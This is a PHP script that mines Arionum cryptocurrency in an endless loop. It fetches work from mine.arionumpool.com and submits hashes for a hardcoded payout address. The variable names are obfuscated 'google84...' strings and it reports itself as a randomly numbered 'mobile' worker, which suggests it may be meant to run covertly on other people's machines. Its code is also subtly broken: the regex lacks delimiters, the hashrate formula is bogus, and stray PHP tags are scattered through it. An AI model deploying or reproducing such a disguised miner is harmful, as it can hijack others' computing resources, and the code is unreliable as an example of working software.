<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

date_default_timezone_set($googleappscountryapps8884);

$google8474747474 = rand("8884","888884");

$google84127474747474 = "34";

$hash84 = array();

for ($i = 0; $i < 5; $i++) {

$hash84[] = "google84";

}

while (1) {

$starttime = microtime(true);

$res = "http://mine.arionumpool.com/mine.php?q=info";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $res);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$res8474747474747474 = curl_exec($ch);
curl_close($ch);

for ($i = 0; $i < 34; $i++) {

echo "mining...";

$info = json_decode($res8474747474747474, true);
$data = $info['data'];
$block = $data['block'];
$difficulty = $data['difficulty'];
$publickey = $data['public_key'];
$height = $data['height'];
$limit = $data['limit'];
$argonmemory = $data['argon_mem'];
$argonthreads = $data['argon_threads'];
$argontime = $data['argon_time'];
$nonce = base64_encode(openssl_random_pseudo_bytes(32));
$nonce = preg_replace("/[^a-zA-Z0-9]/", "", $nonce);
$base = $publickey."-".$nonce."-".$block."-".$difficulty;

$argon84 = password_hash($base,PASSWORD_ARGON2I,['memory_cost' => $argonmemory, "time_cost" => $argontime, "threads" => $argonthreads]);

$hash = $base.$argon84;
            foreach ($hash84 as $google84747474747474) {
                $hash = hash("sha512", $hash, true);
            }
            $hash = hash("sha512", $hash);


            $m = str_split($hash, 2);

            $duration = hexdec($m[10]).hexdec($m[15]).hexdec($m[20]).hexdec($m[23]).
                hexdec($m[31]).hexdec($m[40]).hexdec($m[45]).hexdec($m[55]);
            $duration = ltrim($duration, '0');

            $result = gmp_div($duration, $difficulty);

if ($result > 0 && $result <= $limit) {

$argon = preg_replace("/(.*)p=[0-9](.*)/","$2",$argon84);

?>

<?php

$postData = http_build_query(
            [
                'argon'       => $argon,
                'nonce'       => $nonce,
                'private_key' => "Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj",
                'public_key'  => $publickey,
                'address'     => "Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj",
            ]
        );

        $opts = [
            'http' =>
                [
                    'method'  => 'POST',
                    'header'  => 'Content-type: application/x-www-form-urlencoded',
                    'content' => $postData,
                ],
        ];

        $context = stream_context_create($opts);

$res = file_get_contents("http://mine.arionumpool.com/mine.php?q=submitNonce", false, $context);

$data = json_decode($res, true);

$google8474 = $data['data'];

if(preg_match("accept",$google8474))

{

echo "hash accepted";

}

?>

<?php

}

?>

<?php

}

$endtime = microtime(true);

$google84 = $endtime - $starttime;

$google84 = $google84 / ($google84 * $google84);

$google84747474747474747474 = $google84 * $google84127474747474;

$google84 = preg_replace("/(.*)\.(.*)/","$1",$google84747474747474747474);

$extra = "&id=$google8474747474&worker=mobile$google8474747474&address=Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj&hashrate=$google84&miner=4&hrgpu=0";

echo "$google84747474747474747474" . " H/s" . "\n";

$res8474 = "http://mine.arionumpool.com/mine.php?q=info".$extra;

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $res8474);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res8474 = curl_exec($ch);
    curl_close($ch);

echo "$res8474";

}

?>

